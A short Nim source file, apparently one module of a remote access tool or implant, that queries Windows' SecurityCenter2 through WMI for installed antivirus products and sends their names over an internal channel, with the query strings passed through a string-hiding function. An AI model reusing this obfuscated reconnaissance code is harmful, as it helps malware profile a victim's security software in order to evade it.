from winim/com import toVariant
from winim/com import variantConverterToString
from winim/com import items
from winim/com import GetObject
from winim/com import `.`
from winim/com import get

import ../functions/hideString

from ../channels import mainChannel

proc getAVS(): void =
  var wmi = GetObject d e"winmgmts:{impersonationLevel=impersonate}!\\.\root\SecurityCenter2"

  for av in wmi.execQuery d e"select * from AntivirusProduct":
    mainChannel.send "av: " & $av.displayName

proc initGetAVSThread*(): void {.thread.} =
  getAVS()
